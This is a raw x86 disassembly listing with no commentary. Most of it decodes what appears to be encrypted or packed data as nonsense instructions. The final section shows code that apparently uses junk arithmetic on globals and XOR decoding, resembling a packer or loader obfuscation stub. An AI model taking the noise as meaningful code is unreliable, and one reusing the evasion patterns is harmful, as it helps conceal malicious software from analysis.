  4030f6:	mov    edi,0xc55f1c90
  4030fb:	ss dec esi
  4030fd:	cmp    esi,DWORD PTR [eax-0x38588f73]
  403103:	(bad)  
  403104:	test   eax,0x99ca10dc
  403109:	xchg   al,cl
  40310b:	call   0xd017:0x3c6ce3d7
  403112:	sahf   
  403113:	mov    ah,BYTE PTR [ebx]
  403115:	repz sub eax,0x21224b01
  40311b:	push   eax
  40311c:	jmp    0xbeaaa003
  403121:	dec    ebp
  403122:	addr16 cwde 
  403124:	push   esp
  403125:	pop    eax
  403126:	cld    
  403127:	sar    bl,cl
  403129:	adc    BYTE PTR [edx+0x5c7ad276],0x5d
  403130:	(bad)  
  403132:	sbb    ebx,DWORD PTR ds:0x5b65c0fc
  403138:	dec    edi
  403139:	repz sub DWORD PTR [edx-0x6d],ebp
  40313d:	dec    esi
  40313e:	mov    ds:0x893e2729,al
  403143:	js     0x4031a8
  403145:	(bad)  
  403146:	sub    eax,0x85a2456a
  40314b:	vmwrite eax,DWORD PTR [ecx]
  40314e:	scas   al,BYTE PTR es:[edi]
  40314f:	xchg   esp,eax
  403150:	ror    DWORD PTR [edx-0x94ec453],cl
  403156:	ja     0x403151
  403158:	pop    ds
  403159:	or     BYTE PTR [si-0x77],dl
  40315d:	test   DWORD PTR [ecx],ebp
  40315f:	sbb    DWORD PTR [ecx-0x55d33552],esi
  403165:	xchg   edi,eax
  403166:	data16 and BYTE PTR [esi],ch
  403169:	out    0x71,eax
  40316b:	stos   BYTE PTR es:[edi],al
  40316c:	xchg   edi,eax
  40316d:	sbb    al,0x74
  40316f:	imul   ebp,DWORD PTR [edi-0x183cb89c],0x1
  403176:	push   0x3e
  403178:	je     0x403132
  40317a:	arpl   WORD PTR [ebx],sp
  40317c:	pop    ebx
  40317d:	das    
  40317e:	in     eax,0x76
  403180:	mov    esp,0xc3309001
  403185:	pop    ebp
  403186:	mov    ds:0xf7acf03f,eax
  40318b:	dec    edx
  40318c:	pop    eax
  40318d:	add    DWORD PTR [eax+0x3e],eax
  403190:	inc    esp
  403191:	retf   
  403192:	retf   
  403193:	jecxz  0x403147
  403195:	inc    esi
  403196:	and    eax,0x4d2f0ead
  40319b:	icebp  
  40319c:	fstp   QWORD PTR [edx]
  40319e:	scas   al,BYTE PTR es:[edi]
  40319f:	lods   eax,DWORD PTR ds:[esi]
  4031a0:	mov    al,ds:0x9704ae85
  4031a5:	pusha  
  4031a6:	(bad)
  4031a9:	and    eax,0x654d5d38
  4031ae:	gs popa 
  4031b0:	cmp    bh,dl
  4031b2:	stos   BYTE PTR es:[edi],al
  4031b3:	cld    
  4031b4:	repnz into 
  4031b6:	fcomp  DWORD PTR [edx-0x3e]
  4031b9:	jp     0x4031da
  4031bb:	jmp    0xf7f12ec6
  4031c0:	pop    ebx
  4031c1:	repnz mov cl,0x62
  4031c4:	inc    ebp
  4031c5:	sbb    dl,BYTE PTR [ebp+0x2fdda11a]
  4031cb:	push   eax
  4031cc:	aam    0x7b
  4031ce:	cli    
  4031cf:	add    edx,DWORD PTR [eax]
  4031d1:	aas    
  4031d2:	out    dx,eax
  4031d3:	sbb    bh,BYTE PTR [ecx+eax*2-0x26]
  4031d7:	test   eax,0x52c3ae45
  4031dd:	adc    ch,BYTE PTR [ebp+0x5]
  4031e0:	outs   dx,BYTE PTR ds:[esi]
  4031e1:	pop    edx
  4031e2:	test   eax,0x22038233
  4031e7:	sbb    dl,dh
  4031e9:	mov    dl,0x83
  4031eb:	and    bh,dl
  4031ed:	add    eax,0xa71669a
  4031f2:	loope  0x4031a3
  4031f4:	fsub   DWORD PTR [ecx]
  4031f6:	(bad)  
  4031f7:	cmp    dh,BYTE PTR [esi+0x7a]
  4031fa:	add    DWORD PTR [edx],eax
  4031fc:	aam    0x30
  4031fe:	shl    bl,1
  403200:	or     DWORD PTR gs:[ebx+eiz*1],esi
  403204:	je     0x40325a
  403206:	cs imul ebx,esi,0x3c06583d
  40320d:	inc    ebx
  40320e:	outs   dx,BYTE PTR fs:[esi]
  403210:	and    eax,0x7d2a6c0b
  403215:	inc    edi
  403216:	dec    ecx
  403217:	xchg   BYTE PTR [esi-0x52],cl
  40321a:	lock or esp,eax
  40321d:	jnp    0x4031ce
  40321f:	push   ds
  403220:	pop    ss
  403221:	inc    esi
  403222:	popa   
  403223:	rcr    esp,0x9b
  403226:	ficom  WORD PTR [ebp+0x6d6292e0]
  40322c:	xor    eax,0x47e82be8
  403231:	(bad)  
  403232:	retf   
  403233:	fnstenv [ebx-0x7a]
  403236:	pop    edx
  403237:	lock mov bl,0x80
  40323a:	scas   al,BYTE PTR es:[edi]
  40323b:	pop    ecx
  40323c:	push   es
  40323d:	xor    al,0xae
  40323f:	pop    ebp
  403240:	lahf   
  403241:	jae    0x403224
  403243:	lahf   
  403244:	(bad)  
  403246:	xor    ebp,ebp
  403248:	push   cs
  403249:	mov    edx,0xbea1c34e
  40324e:	inc    eax
  40324f:	adc    ebp,DWORD PTR [edx+0x7a]
  403252:	jecxz  0x403233
  403254:	xchg   edi,eax
  403255:	stos   DWORD PTR es:[edi],eax
  403256:	out    dx,eax
  403257:	and    al,BYTE PTR [esi]
  403259:	in     al,dx
  40325a:	loop   0x403249
  40325c:	and    al,bl
  40325e:	adc    bh,bl
  403260:	popa   
  403261:	pop    edx
  403262:	rcl    BYTE PTR [esi-0x3d4e3393],1
  403268:	lea    ebp,[esi-0x74]
  40326b:	popa   
  40326c:	test   al,0x1c
  40326e:	or     DWORD PTR [esi],0xf7b5cfd9
  403274:	or     BYTE PTR [edx],ch
  403276:	outs   dx,DWORD PTR ds:[esi]
  403277:	stc    
  403278:	sub    DWORD PTR [esi],0x1d4de648
  40327e:	adc    edx,ebp
  403280:	jno    0x403295
  403282:	or     bh,bh
  403284:	out    dx,al
  403285:	aaa    
  403286:	cmp    ah,BYTE PTR [esi+0x48]
  403289:	adc    DWORD PTR [edx+0x61],ebx
  40328c:	mov    dl,BYTE PTR [ebx+edx*8-0x4fecf50b]
  403293:	or     DWORD PTR [edi+0x7fd339df],ebx
  403299:	scas   al,BYTE PTR es:[edi]
  40329a:	out    dx,al
  40329b:	out    0x9d,eax
  40329d:	and    dl,BYTE PTR ds:0xdb28574
  4032a3:	sub    ebp,DWORD PTR [ecx]
  4032a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4032a6:	mov    cl,0x9a
  4032a8:	std    
  4032a9:	or     ecx,DWORD PTR [ecx+0x13]
  4032ac:	mov    cl,0x8b
  4032ae:	dec    ecx
  4032af:	jae    0x40329d
  4032b1:	and    al,0xa9
  4032b3:	int3   
  4032b4:	scas   al,BYTE PTR es:[edi]
  4032b5:	popa   
  4032b6:	enter  0x82bd,0x1d
  4032ba:	mov    esi,0x1020bafa
  4032bf:	adc    al,bh
  4032c1:	retf   0xa0ff
  4032c4:	popf   
  4032c5:	mov    bl,0x7c
  4032c7:	push   ebp
  4032c8:	int    0x2
  4032ca:	dec    eax
  4032cb:	call   FWORD PTR [ebx]
  4032cd:	inc    edi
  4032ce:	(bad)  
  4032cf:	cmp    cl,BYTE PTR [ebx+0x51]
  4032d2:	xchg   edx,eax
  4032d3:	jge    0x40328b
  4032d5:	push   edx
  4032d6:	and    BYTE PTR [ebp-0x6e638329],al
  4032dc:	xchg   edi,edx
  4032de:	mov    BYTE PTR [ecx-0x1c],0x10
  4032e2:	add    eax,0xb16fb5a4
  4032e7:	outs   dx,DWORD PTR ds:[esi]
  4032e8:	test   DWORD PTR ds:0xaea06198,esp
  4032ee:	mov    DWORD PTR [ebx+0x1c],eax
  4032f1:	or     al,0x2f
  4032f3:	mov    dh,bh
  4032f5:	xchg   esi,eax
  4032f6:	daa    
  4032f7:	and    esi,DWORD PTR [ecx]
  4032f9:	aam    0x69
  4032fb:	pop    ecx
  4032fc:	xor    edx,DWORD PTR [ecx]
  4032fe:	cmp    DWORD PTR [esi+0x41],ebp
  403301:	(bad)  
  403302:	ins    DWORD PTR es:[edi],dx
  403303:	fstp   QWORD PTR [edi-0x2344c859]
  403309:	sbb    eax,0x32dfe935
  40330e:	idiv   dh
  403310:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403311:	call   0xf4cc:0x80e2ca69
  403318:	test   ecx,eax
  40331a:	xor    al,0x72
  40331c:	es and eax,0x98d7e1aa
  403322:	mov    cs,WORD PTR [edx-0x24]
  403325:	sbb    DWORD PTR [ebx],edi
  403327:	push   esi
  403328:	push   eax
  403329:	add    ah,ch
  40332b:	pushf  
  40332c:	sbb    eax,0xfff5b132
  403331:	aas    
  403332:	das    
  403333:	and    eax,0x62176df0
  403338:	ja     0x40335a
  40333a:	sahf   
  40333b:	inc    esi
  40333c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40333d:	pop    eax
  40333e:	cmp    DWORD PTR [edx+0x4c],ecx
  403341:	in     al,dx
  403342:	jbe    0x4033a0
  403344:	pop    edx
  403345:	mov    cl,0xaa
  403347:	sub    cl,BYTE PTR ds:0xf0b01a7b
  40334d:	out    dx,eax
  40334e:	pop    edx
  40334f:	inc    ebx
  403350:	lock push esi
  403352:	daa    
  403353:	adc    eax,0x308b30dc
  403358:	and    edx,DWORD PTR [edx+esi*2]
  40335b:	popa   
  40335c:	adc    BYTE PTR [esi],bh
  40335e:	sub    al,0x83
  403360:	xlat   BYTE PTR ds:[ebx]
  403361:	iret   
  403362:	jae    0x403307
  403364:	push   ecx
  403365:	dec    esp
  403366:	stos   DWORD PTR es:[edi],eax
  403367:	sub    edi,DWORD PTR [edx]
  403369:	xchg   esp,eax
  40336a:	adc    BYTE PTR [eax],0x21
  40336d:	or     BYTE PTR [edx],0x15
  403370:	pop    eax
  403371:	out    dx,al
  403372:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403373:	outs   dx,BYTE PTR ds:[esi]
  403374:	arpl   bp,bx
  403376:	fwait
  403377:	test   eax,0xd39aa352
  40337c:	cmp    edi,DWORD PTR [ebp-0x715e4350]
  403382:	mov    WORD PTR [ebp+0x5e],ss
  403385:	xlat   BYTE PTR ds:[ebx]
  403386:	repnz inc esi
  403388:	arpl   ax,bp
  40338a:	jmp    0xd908:0xc86b950b
  403391:	adc    al,0xf9
  403393:	push   eax
  403394:	call   0xc18a:0x93d7b29c
  40339b:	add    eax,0x65906a69
  4033a0:	pcmpgtw mm0,QWORD PTR [esi]
  4033a3:	and    al,0x9f
  4033a5:	adc    ah,BYTE PTR [ecx+ecx*1-0x79]
  4033a9:	repz jnp 0x403423
  4033ac:	jns    0x4033eb
  4033ae:	xor    ch,BYTE PTR [ebx+0x771d6e9a]
  4033b4:	cmc    
  4033b5:	and    BYTE PTR [esi+0x4e],cl
  4033b8:	or     DWORD PTR [ebx-0x2d],edi
  4033bb:	rol    DWORD PTR ds:0x285ebc50,0xab
  4033c2:	loope  0x40340e
  4033c4:	mov    ds:0x618b856f,al
  4033c9:	aas    
  4033ca:	mov    cl,0x79
  4033cc:	adc    ebx,edi
  4033ce:	mov    cl,0x4d
  4033d0:	in     al,dx
  4033d1:	xor    al,0xa
  4033d3:	mov    ebx,DWORD PTR [edi-0x5064a09e]
  4033d9:	aas    
  4033da:	lods   al,BYTE PTR ds:[esi]
  4033db:	shl    dh,cl
  4033dd:	dec    esp
  4033de:	mov    ch,0xd1
  4033e0:	popa   
  4033e1:	stos   BYTE PTR es:[edi],al
  4033e2:	sub    eax,0xfc382aa2
  4033e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033e8:	cli    
  4033e9:	mov    bh,0xfb
  4033eb:	aaa    
  4033ec:	mov    esp,0xd7f51c2e
  4033f1:	mov    ecx,fs
  4033f3:	dec    ebx
  4033f4:	inc    edi
  4033f5:	js     0x403382
  4033f7:	mov    edi,0xa10c97fd
  4033fc:	mov    eax,ds:0xd9a8408c
  403401:	dec    ecx
  403402:	test   ebp,edx
  403404:	add    edx,DWORD PTR [ebp+0x46]
  403407:	test   DWORD PTR [ecx-0x65],0xab432139
  40340e:	mov    bh,0x1e
  403410:	lock imul edi,DWORD PTR [eax-0x5480ef87],0x77
  403418:	xlat   BYTE PTR ds:[ebx]
  403419:	xchg   ebp,eax
  40341a:	ds mov dl,0xf5
  40341d:	push   ecx
  40341e:	xor    edx,DWORD PTR [eax-0x35]
  403421:	jnp    0x40345c
  403423:	retf   
  403424:	in     eax,dx
  403425:	test   eax,0x1b42bf58
  40342a:	mov    ebx,0xe64480c8
  40342f:	xchg   al,al
  403431:	fistp  QWORD PTR [ebx+0x75]
  403434:	in     eax,dx
  403435:	or     edx,DWORD PTR [bp+di+0x792f]
  40343a:	ret    
  40343b:	aaa    
  40343c:	jo     0x40340d
  40343e:	xlat   BYTE PTR ds:[ebx]
  40343f:	xchg   esi,eax
  403440:	das    
  403441:	jae    0x40342c
  403443:	jge    0x4034b5
  403445:	dec    edi
  403446:	mov    bh,0x1b
  403448:	mov    ebp,ecx
  40344a:	mov    edx,0x84848af3
  40344f:	or     eax,DWORD PTR [esi]
  403451:	ins    BYTE PTR es:[edi],dx
  403452:	cs scas eax,DWORD PTR es:[edi]
  403454:	mov    ds,WORD PTR [esi-0x11f683be]
  40345a:	pop    ecx
  40345b:	out    dx,al
  40345c:	mov    ecx,0x3d79e015
  403461:	xchg   ecx,eax
  403462:	cmp    al,0xe
  403464:	jnp    0x40348b
  403466:	push   ebp
  403467:	shl    BYTE PTR [eax],cl
  403469:	push   edx
  40346a:	xchg   BYTE PTR [edx],ch
  40346c:	div    DWORD PTR [esi]
  40346e:	mov    ah,0x84
  403470:	js     0x40341d
  403472:	ja     0x4034c4
  403474:	loop   0x4034a6
  403476:	adc    bh,ch
  403478:	mov    dl,0x7b
  40347a:	sbb    BYTE PTR [edx+0x2b361fbe],bl
  403480:	call   0xc33d70c0
  403485:	sub    eax,0x4a764162
  40348a:	pop    ecx
  40348b:	sti    
  40348c:	retf   
  40348d:	sub    ebp,DWORD PTR [esi]
  40348f:	jp     0x40348a
  403491:	jmp    0x40341e
  403493:	mov    esp,0x3d4ef1bb
  403499:	or     BYTE PTR [eax+0x56],0xb9
  40349d:	loopne 0x403458
  40349f:	enter  0xa4e0,0xda
  4034a3:	shl    BYTE PTR [ecx-0x4b],0xb7
  4034a7:	stc    
  4034a8:	mov    esi,0xa0a83713
  4034ad:	pop    es
  4034ae:	mov    eax,0x1adf2ae
  4034b3:	add    bh,BYTE PTR [ebx-0x6e08b152]
  4034b9:	adc    esi,DWORD PTR [ecx-0x54]
  4034bc:	icebp  
  4034bd:	mov    bh,0x2c
  4034bf:	addr16 dec ebp
  4034c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4034c2:	add    cl,ch
  4034c4:	scas   eax,DWORD PTR es:[edi]
  4034c5:	sub    DWORD PTR [ebx+0xe],edx
  4034c8:	lock cs retf 
  4034cb:	mov    al,ds:0xb7f78eda
  4034d0:	jb     0x403463
  4034d2:	nop
  4034d3:	neg    DWORD PTR [eax+0x5d]
  4034d6:	push   es
  4034d7:	inc    edi
  4034d8:	mov    ebp,0x9195c0b9
  4034dd:	dec    edi
  4034de:	xlat   BYTE PTR ds:[ebx]
  4034df:	jl     0x4034a6
  4034e1:	jne    0x4034ee
  4034e3:	push   es
  4034e4:	in     eax,0x68
  4034e6:	lods   al,BYTE PTR ds:[esi]
  4034e7:	mov    ch,0x34
  4034e9:	adc    DWORD PTR [eax-0x791338c8],edi
  4034ef:	add    ah,BYTE PTR [eax+0x22]
  4034f2:	jmp    0xa628:0x8b60ad65
  4034f9:	js     0x4034a4
  4034fb:	mov    edx,DWORD PTR [ecx+eax*2]
  4034fe:	mov    edi,es
  403500:	push   0xffffffde
  403502:	dec    esi
  403503:	adc    al,0x51
  403505:	mov    bl,0x1c
  403507:	test   BYTE PTR [ebx-0x4e],dl
  40350a:	push   esp
  40350b:	cmp    BYTE PTR [ebx+0x4d],ch
  40350e:	jg     0x4034b6
  403510:	gs push ss
  403512:	pop    ecx
  403513:	out    0x60,eax
  403515:	push   es
  403516:	or     eax,0x9227c21
  40351b:	adc    ebx,ebp
  40351d:	push   ss
  40351e:	scas   eax,DWORD PTR es:[edi]
  40351f:	sub    DWORD PTR [edi],0x46
  403522:	out    dx,al
  403523:	mov    al,ds:0xef3abcc4
  403528:	je     0x40358b
  40352a:	lea    ebp,[esi+0x2a858b87]
  403530:	fisub  WORD PTR [edi+0x3c574a6c]
  403536:	out    0x1,al
  403538:	adc    al,0xc8
  40353a:	mov    al,0x6d
  40353c:	pop    esi
  40353d:	xor    ah,BYTE PTR [edx+0x4e]
  403540:	cmp    al,0xf8
  403542:	loopne 0x4034cf
  403544:	jbe    0x40353c
  403546:	inc    esp
  403547:	aaa    
  403548:	dec    edx
  403549:	push   0xffffffe6
  40354b:	xchg   edx,eax
  40354c:	call   0x170f:0xd51a2746
  403553:	enter  0xb80b,0x6c
  403557:	cli    
  403558:	stos   BYTE PTR es:[edi],al
  403559:	fsub   st,st(6)
  40355b:	lock sti 
  40355d:	jnp    0x4035d9
  40355f:	xchg   esp,eax
  403560:	xchg   edx,eax
  403561:	dec    esi
  403562:	pop    eax
  403563:	call   0x38120d75
  403568:	inc    ebx
  403569:	mov    esi,0x2d04d4f4
  40356e:	xchg   ebp,eax
  40356f:	ss jae 0x4035aa
  403572:	push   ds
  403573:	cmc    
  403574:	push   es
  403575:	sbb    BYTE PTR [esi-0x4c],0x13
  403579:	lock sub BYTE PTR [ebx+0x41],cl
  40357d:	adc    eax,0x108a71b
  403582:	mov    ah,0xe1
  403584:	retf   0xf152
  403587:	sti    
  403588:	sar    DWORD PTR [edi+esi*4+0x30],cl
  40358c:	clc    
  40358d:	mov    ebx,DWORD PTR [ecx+0x7d]
  403590:	or     DWORD PTR [ebp+0x3c],0xffffffd6
  403594:	(bad)  
  403595:	loop   0x403582
  403597:	sbb    BYTE PTR [edx+ebp*4+0x546975c5],0x59
  40359f:	lock fist DWORD PTR [ebp-0x3e]
  4035a3:	mov    ebp,0x4e474ea
  4035a8:	xchg   ecx,eax
  4035a9:	lods   eax,DWORD PTR gs:[esi]
  4035ab:	push   es
  4035ac:	idiv   BYTE PTR [ebx]
  4035ae:	call   0x4fc3:0x19210fb9
  4035b5:	imul   esp,ebp,0x9
  4035b8:	inc    edx
  4035b9:	mov    eax,ds:0x620f4f78
  4035be:	or     esi,DWORD PTR [esi+edx*2+0x67]
  4035c2:	data16 repnz fistp QWORD PTR [ebx-0x54]
  4035c7:	mov    ds:0xdf30f4c9,al
  4035cc:	and    DWORD PTR [edx-0x5330518e],0x5
  4035d3:	aam    0xaf
  4035d5:	add    ch,BYTE PTR [edi+eiz*4+0x21]
  4035d9:	add    ecx,0x5e
  4035dc:	repnz rol DWORD PTR [ebp+esi*1-0x27ad952e],0xa3
  4035e5:	icebp  
  4035e6:	xchg   edi,eax
  4035e7:	dec    edi
  4035e8:	aas    
  4035e9:	mov    edx,0x708b41d1
  4035ee:	ror    edx,1
  4035f0:	push   cs
  4035f1:	int    0x20
  4035f3:	into   
  4035f4:	sbb    BYTE PTR [ebx],ch
  4035f6:	cs retf 
  4035f8:	repnz test BYTE PTR [ebx],bl
  4035fb:	fbld   TBYTE PTR [edx-0x22]
  4035fe:	mov    edi,0x7658752f
  403603:	test   BYTE PTR gs:[edx-0xc],ah
  403607:	outs   dx,BYTE PTR ds:[esi]
  403608:	scas   eax,DWORD PTR es:[edi]
  403609:	xchg   ecx,eax
  40360a:	das    
  40360b:	popf   
  40360c:	xchg   BYTE PTR ds:0x498807d3,ah
  403612:	fstp   DWORD PTR [ebx-0xc0c5cbc]
  403618:	xor    DWORD PTR [ecx+0x51],ebx
  40361b:	sbb    BYTE PTR [ebx],dl
  40361d:	sbb    al,BYTE PTR [edx]
  40361f:	mov    bl,0x8e
  403621:	rol    DWORD PTR [edi],0x22
  403624:	sub    BYTE PTR [ecx+0x3dcfd742],cl
  40362a:	xchg   esp,eax
  40362b:	(bad)  
  40362c:	test   al,0x2d
  40362e:	pop    ebx
  40362f:	shl    bh,cl
  403631:	pop    edi
  403632:	ds add BYTE PTR ss:[ebx+ebp*2],al
  403637:	fistp  QWORD PTR [edx]
  403639:	pop    ebp
  40363a:	ret    0x5043
  40363d:	sbb    ecx,0x51
  403640:	lds    eax,FWORD PTR [edx-0x6c]
  403643:	sbb    BYTE PTR es:[ebx-0x15],bl
  403647:	xchg   edi,eax
  403648:	mov    bh,BYTE PTR [ebx-0x3b]
  40364b:	mul    BYTE PTR [ecx+0x2e]
  40364e:	les    eax,FWORD PTR [esi+0x62]
  403651:	xor    DWORD PTR [edx+0x53369a53],ebx
  403657:	jle    0x403650
  403659:	sbb    al,al
  40365b:	xor    eax,0xb3e72c6c
  403660:	mov    ecx,0x4ce88cde
  403665:	imul   edi,DWORD PTR [eax+esi*8],0xd7cab627
  40366c:	shl    BYTE PTR ds:0xd09ead80,0x5
  403673:	(bad)  
  403674:	call   0x116ea5ce
  403679:	or     BYTE PTR [edi+0x14],ch
  40367c:	stos   DWORD PTR es:[edi],eax
  40367d:	dec    ebp
  40367e:	(bad)  
  40367f:	in     eax,dx
  403680:	fs int3 
  403682:	je     0x4036c3
  403684:	sbb    DWORD PTR [ebp+0x257eb8d2],edx
  40368a:	cmp    DWORD PTR cs:0x5440557c,esp
  403691:	aaa    
  403692:	jl     0x40362b
  403694:	push   edx
  403695:	mov    esi,0xf104f61c
  40369a:	jne    0x4036e8
  40369c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40369d:	sbb    al,BYTE PTR ds:0xb6988f65
  4036a3:	xor    eax,0xab209115
  4036a8:	mov    bl,0x52
  4036aa:	mov    edi,0xd7529802
  4036af:	cld    
  4036b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4036b1:	jecxz  0x403673
  4036b3:	clc    
  4036b4:	retf   0xe3da
  4036b7:	lea    edi,[ebx]
  4036b9:	adc    al,0xa9
  4036bb:	jb     0x40373b
  4036bd:	mov    ebp,DWORD PTR [edi+ecx*2+0x22]
  4036c1:	xchg   ebx,eax
  4036c2:	lahf   
  4036c3:	cld    
  4036c4:	enter  0x1679,0x21
  4036c8:	les    edx,FWORD PTR [edx-0x68]
  4036cb:	scas   al,BYTE PTR es:[edi]
  4036cc:	gs test cl,bh
  4036cf:	pop    ecx
  4036d0:	test   BYTE PTR [ebp-0x31],bl
  4036d3:	sahf   
  4036d4:	icebp  
  4036d5:	data16 lock es in al,0x97
  4036da:	loop   0x403684
  4036dc:	ror    BYTE PTR [esi+0x60],cl
  4036df:	jno    0x403706
  4036e1:	outs   dx,DWORD PTR ds:[esi]
  4036e2:	lahf   
  4036e3:	mov    edi,0x61d15bf8
  4036e8:	inc    ebx
  4036e9:	add    ah,al
  4036eb:	jbe    0x4036bb
  4036ed:	fnsave [ebx-0x40]
  4036f0:	jmp    0xe981c510
  4036f5:	push   0xfffffff6
  4036f7:	add    eax,0x563de6b3
  4036fc:	add    DWORD PTR ds:0xe843f554,ecx
  403702:	fldcw  WORD PTR [edx]
  403704:	pop    es
  403705:	scas   al,BYTE PTR es:[edi]
  403706:	jge    0x403743
  403708:	gs push ss
  40370a:	call   0x14bb:0x67adc36c
  403711:	and    DWORD PTR [eax-0x1],edx
  403714:	fld    TBYTE PTR [ebp+0x20]
  403717:	retf   
  403718:	gs scas al,BYTE PTR es:[edi]
  40371a:	inc    ecx
  40371b:	inc    esp
  40371c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40371d:	or     al,0xc
  40371f:	sub    ebp,ebx
  403721:	iret   
  403722:	dec    edx
  403723:	aad    0x24
  403725:	push   0x26
  403727:	mov    eax,0xfff874b1
  40372c:	cmp    DWORD PTR [eax-0x211c64ce],ecx
  403732:	sub    ecx,DWORD PTR ds:0xd4991d39
  403738:	cmp    edx,ebp
  40373a:	add    BYTE PTR [ecx+esi*8+0x5b65d28d],ch
  403741:	(bad)  
  403742:	gs out dx,al
  403744:	cld    
  403745:	fnstenv [ebp+0x1f5cec44]
  40374b:	push   esp
  40374c:	push   eax
  40374d:	xchg   dl,dh
  40374f:	mov    al,ds:0xf3aae5fd
  403754:	lahf   
  403755:	xchg   edx,eax
  403756:	int3   
  403757:	adc    bh,dl
  403759:	fist   WORD PTR [ecx+0x4e52c5ad]
  40375f:	xor    DWORD PTR [edi+edi*8],edi
  403762:	lds    ecx,FWORD PTR [edx-0x1fb40146]
  403768:	in     eax,dx
  403769:	push   ecx
  40376a:	sub    dl,cl
  40376c:	lods   al,BYTE PTR ds:[esi]
  40376d:	lock xchg ecx,eax
  40376f:	ret    
  403770:	cmp    edx,DWORD PTR [edx]
  403772:	jge    0x4037e5
  403774:	call   0xa5adfb5
  403779:	cmc    
  40377a:	sbb    ch,ch
  40377c:	out    dx,al
  40377d:	jb     0x40373b
  40377f:	dec    ebp
  403780:	jb     0x403735
  403782:	push   ebx
  403783:	repz hlt 
  403785:	jbe    0x4037a8
  403787:	leave  
  403788:	pushf  
  403789:	fld    QWORD PTR [edx]
  40378b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40378c:	cmp    al,BYTE PTR [edi]
  40378e:	push   ebx
  40378f:	jecxz  0x403777
  403791:	sub    DWORD PTR [edx+0x2e899320],ecx
  403797:	leave  
  403798:	and    BYTE PTR [esi-0x14fc5815],0xbe
  40379f:	add    edi,ebx
  4037a1:	mov    bh,0xab
  4037a3:	ins    DWORD PTR es:[edi],dx
  4037a4:	xlat   BYTE PTR ds:[ebx]
  4037a5:	xchg   esi,eax
  4037a6:	and    BYTE PTR [ebp+0x71a08beb],bl
  4037ac:	and    ch,BYTE PTR [esi+0x4cdb8dbd]
  4037b2:	sub    BYTE PTR [ecx+0x3f8e64ba],cl
  4037b8:	push   esi
  4037b9:	inc    eax
  4037ba:	inc    DWORD PTR [esp+eiz*2]
  4037bd:	cdq    
  4037be:	aaa    
  4037bf:	mov    dh,0xd6
  4037c1:	loopne 0x4037af
  4037c3:	mov    bl,dl
  4037c5:	push   0xffffffd3
  4037c7:	mov    ebx,0x5164ce80
  4037cc:	xor    DWORD PTR [ecx],edx
  4037ce:	sbb    DWORD PTR [esi+ecx*4+0x2e1b5bb0],eax
  4037d5:	lahf   
  4037d6:	push   ecx
  4037d7:	pop    ebp
  4037d8:	bound  eax,QWORD PTR [eax+0x26]
  4037db:	mov    eax,ds:0x1b7a49a0
  4037e0:	test   ebx,edx
  4037e2:	fcmovnu st,st(6)
  4037e4:	addr16 xor al,0x12
  4037e7:	fucomip st,st(6)
  4037e9:	xchg   esi,eax
  4037ea:	pop    ds
  4037eb:	test   al,0x13
  4037ed:	ins    DWORD PTR es:[edi],dx
  4037ee:	aad    0xba
  4037f0:	std    
  4037f1:	jge    0x40380c
  4037f3:	pop    ss
  4037f4:	les    ecx,FWORD PTR ds:0x481ea8c3
  4037fa:	ds in  al,dx
  4037fc:	test   eax,0x7820c1e1
  403801:	xchg   esi,eax
  403802:	xchg   ebx,eax
  403803:	aam    0xe6
  403805:	push   cs
  403806:	mov    bl,0x7c
  403808:	pop    ebx
  403809:	sbb    BYTE PTR [esi],bl
  40380b:	fs in  al,dx
  40380d:	cmp    DWORD PTR [eax-0x47],ecx
  403810:	pop    ss
  403811:	cmp    al,0xaf
  403813:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403814:	mov    al,ds:0x8bf0458b
  403819:	dec    ebp
  40381a:	lock xor eax,esi
  40381d:	xor    ecx,esi
  40381f:	sub    DWORD PTR ds:0x428eb3,0x5e8a
  403829:	lea    ecx,[eax+ecx*1+0x64e5ec]
  403830:	mov    eax,DWORD PTR [ebp-0xc]
  403833:	sbb    DWORD PTR ds:0x428e97,0x428e5b
  40383d:	xor    edx,edx
  40383f:	adc    DWORD PTR ds:0x428e4b,0x428eab
  403849:	div    ecx
  40384b:	movzx  eax,WORD PTR ds:0x428e2b
  403852:	add    DWORD PTR ds:0x428eb3,eax
  403858:	mov    eax,DWORD PTR [ebp-0x8]
  40385b:	mov    DWORD PTR ds:0x428e57,0x1e
  403865:	cmp    DWORD PTR ds:0x428e57,0x0
  40386c:	je     0x4038bb
  403872:	cmp    DWORD PTR ds:0x428e57,0x9
  403879:	jb     0x4038bb
  40387f:	jmp    0x40388d
  403884:	push   DWORD PTR [ebp-0x10]
  403887:	call   DWORD PTR ds:0x42aa0b
  40388d:	cmp    DWORD PTR ds:0x428e57,0xa
  403894:	jne    0x4038a7
  40389a:	mov    ecx,DWORD PTR ds:0x428e57
  4038a0:	dec    ecx
  4038a1:	mov    DWORD PTR ds:0x428e57,ecx
  4038a7:	xor    ecx,ecx
  4038a9:	add    ecx,DWORD PTR ds:0x428e57
  4038af:	dec    ecx
  4038b0:	mov    DWORD PTR ds:0x428e57,ecx
  4038b6:	jmp    0x403865
  4038bb:	mov    ecx,DWORD PTR [ebp-0x10]
  4038be:	xor    eax,esi
  4038c0:	xor    ecx,esi
  4038c2:	sub    eax,ecx
  4038c4:	mov    DWORD PTR ds:0x428e43,0x1a6e
  4038ce:	cmp    edx,eax
  4038d0:	mov    DWORD PTR ds:0x428e43,0x4c12
  4038da:	jne    0x403ae6
  4038e0:	mov    eax,DWORD PTR [ebp-0xc]
  4038e3:	mov    dl,BYTE PTR [eax+ebx*1+0x800]
  4038ea:	sbb    eax,DWORD PTR ds:0x428ec3
  4038f0:	mov    eax,DWORD PTR [ebp-0x28]
  4038f3:	mov    ecx,DWORD PTR [ebp-0x18]
  4038f6:	or     DWORD PTR ds:0x428ec3,0x7d0f
  403900:	xor    eax,esi
  403902:	xor    ecx,esi
  403904:	add    eax,edi
  403906:	add    ecx,edi
  403908:	mov    BYTE PTR [ebp-0x21],dl
